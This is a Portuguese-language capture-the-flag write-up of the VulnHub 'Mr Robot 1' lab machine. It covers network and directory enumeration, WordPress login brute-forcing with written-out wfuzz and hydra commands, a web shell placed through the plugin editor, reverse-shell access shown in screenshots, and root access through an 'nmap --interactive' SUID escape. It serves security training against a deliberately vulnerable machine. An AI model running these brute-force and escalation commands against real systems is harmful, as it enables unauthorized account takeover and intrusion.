---
title: "VulnHub - Mr Robot 1"
tags: [Linux,Easy,Web,Gobuster,BurSuite,SQLInjection,Brute Force,WordPress]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/inicial.png)

Link: [Mr Robot 1](https://www.vulnhub.com/entry/mr-robot-1,151/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-morrobot/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 3 portas abertas no servidor

> Porta 22 -> SSH

> Portas 80 e 443 -> Web

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata, parece uma animação interativa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/web.png)

No código fonte não encontramos nada de mais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/web1.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/gobuster.png)

Encontramos um wordpress sendo executado ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wordpress.png)

No `/robots.txt` encontramos dois arquivos interessantes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/robots.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/robots1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/robots2.png)

O problema é que grande parte dessas palavras são repetidas, então vamos fazer outra wordlist com ela com todas as palavras que são únicas

```bash
cat fsocity.dic | sort | uniq > fsocity_unic.dic 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wl.png)

Bom, achamos uma worldist e temos um painel do wordpress... Contudo não temos usuários ainda válidos pra tentar um brute force ali

## User Brute Force Wfuzz

A ideia aqui é enumerarmos usuários através de um ataque de brute force no wordpress

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/burp2.png)

Agora verificamos que o tamanho de uma requisição de usuário inválido é de 4077 bytes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/burp3.png)

```bash
wfuzz -c -z file,fsocity_unic.dic --hw 187,185 -b s_cc=true -b s_fid=24B328365D1B0191-08262D5832B3B584 -b s_nr=1617235532959 -b s_sq=%5B%5BB%5D%5D -b wordpress_test_cookie=WP+Cookie+check -d "log=FUZZ&pwd=teste&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.147%2Fwp-admin%2F&testcookie=1" http://192.168.56.147/wp-login.php
```

Então, bora fazer o brute force pra descobrir os usuários válidos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wfuzz.png)

Opa, encontramos o usuário `elliot` como válido... Agora vamos fazer um brute force na senha dele, com a mesma wordlist

## Senha Brute Force Wfuzz

```bash
wfuzz -c -z file,fsocity_unic.dic --hw 187,185 -b s_cc=true -b s_fid=24B328365D1B0191-08262D5832B3B584 -b s_nr=1617235532959 -b s_sq=%5B%5BB%5D%5D -b wordpress_test_cookie=WP+Cookie+check -d "log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.147%2Fwp-admin%2F&testcookie=1" http://192.168.56.147/wp-login.php
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wfuzz1.png)

Opa, encontramos a senha dele! `ER28-0652`

## User Brute Force Hydra

Também podemos fazer o brute force de usuários com o hydra, aqui vou usar uma wordlist pequena apenas para demostração

```bash
hydra -vV -L mr_robot.txt -p teste 192.168.56.147 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/hydra.png)

Ai está, agora o brute force da senha

## Senha Brute Force Hydra

```bash
hydra -vV -l elliot -P mr_robot.txt 192.168.56.147 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/hydra1.png)

Ai está a senha.

Explicação dos parâmetros do hydra

```
-vV : Verbose
-L mr_robot.txt : Testar todos os usuários e senhas dai
-p senha : Tanto faz, quando coloquei isso era pra fazer fuzzing de usuários
192.168.56.147: IP da máquina alvo
http-post-form : Aqui é o que está sendo forçado

/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
/wp-login.php : O local onde o campo de login e senha está
log=^USER^&pwd=^PASS^&wp-submit=Log+In : O parâmetro POST que vai ser enviado. ^USER^ and ^PASS^ aqui os valores vão ser alterados.
F=Invalid username : O F quer dizer falha, a mensagem que o hydra vai procurar no corpo do texto quando der falha
```

# Acesso Wordpress

Agora com o login e senha dele, vamos entrar na conta dele e ver o que podemos fazer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/login.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/login1.png)

Verificamos que podemos alterar plugins na página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wp.png)

Pegamos um simple php shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wp2.png)

Sucesso!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wp3.png)

## Testando RCE

Testamos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/wp4.png)

Show! Agora é só pegar um shell

# daemon -> robot

Jogamos para o burpsuite para melhor trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b2.png)

Não consegui pegar nenhum que funcionasse, então resolvi jogar um web shell direto lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b5.png)

Agora pegamos o shell reverso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/b6.png)

Verificamos na pasta home do robot que tem um md5 ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro.png)

Conseguimos quebrar ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro1.png)

robot:abcdefghijklmnopqrstuvwxyz

Temos a senha dele, então logamos com ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro2.png)

# robot -> root

Vamos iniciar a escalação de privilégios para root

Pesquisamos por binários com suid habilitado

```bash
find / -perm -4000 2>/dev/null
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro3.png)

Encontramos que o nmap está com umas permissões a mais, coisas que não é normal ter, então exploramos e viramos root

```bash
nmap --interactive
!sh
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro4.png)

Pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-mrrobot/ro5.png)